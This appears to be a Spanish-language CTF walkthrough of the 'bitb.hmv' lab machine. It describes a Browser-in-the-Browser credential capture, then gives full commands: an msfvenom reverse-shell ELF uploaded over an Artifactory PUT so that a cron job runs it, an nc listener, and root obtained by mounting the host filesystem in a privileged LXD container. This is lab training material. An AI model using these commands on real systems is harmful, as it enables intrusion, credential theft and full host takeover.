// Fase 02

02Browser-in-the-Browser → credenciales

Un bot procesa el correo de luke.alike y hace curl a la primera URL. Si la página contiene hooks BitB (data-server-url, stealCredentials, bitbWindow), simula el login y nos POSTea las credenciales de luke.

El bot entrega:

POST /log  →  {
  "username": "luke.alike@bitb.hmv",
  "password": "BrowserInTheBrowserAttack"
}
// Fase 03

03Foothold — Artifactory + Cron RCE

Las credenciales abren un Artifactory en /artifactory/ que acepta PUT. Un cron de abidle descarga y ejecuta el artefacto bored_business_yield_engine.elf cada 300s. Lo reemplazamos por una reverse shell.

exploit
# 1) reverse shell ELF
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.29 LPORT=2222 \
      -f elf -o bored_business_yield_engine.elf

# 2) sobrescribir el artefacto (auth luke)
$ curl -X PUT http://bitb.hmv/artifactory/libs-release-local/bored_business_yield_engine.elf \
      --data-binary @bored_business_yield_engine.elf \
      -u 'luke.alike@bitb.hmv:BrowserInTheBrowserAttack'
HTTP/1.1 201 Created

# 3) el cron lo ejecuta → shell
$ nc -lvnp 2222
connect from 192.168.1.32 ...
$ id
uid=1000(abidle) groups=...,adm,sudo,lxd

// Fase 05

05Privesc → root (grupo lxd)

abidle está en el grupo lxd. El CLI snap falla por falta de sesión, pero el binario real funciona. Montamos un contenedor privilegiado con el / del host.

lxd-privesc
# bypass del snap roto
$ L(){ LXD_DIR=/var/snap/lxd/common/lxd /snap/lxd/current/bin/lxc "$@"; }

$ L image import alpine-lxd.tar.gz --alias pwnimg
$ L storage create pwnpool dir
$ L profile device add default root disk pool=pwnpool path=/
$ L init pwnimg pwnc -c security.privileged=true
$ L config device add pwnc hostroot disk source=/ path=/mnt/host recursive=true
$ L start pwnc
$ L exec pwnc -- sh -c 'cat /mnt/host/root/root.txt'
uid=0(root) → ROOT
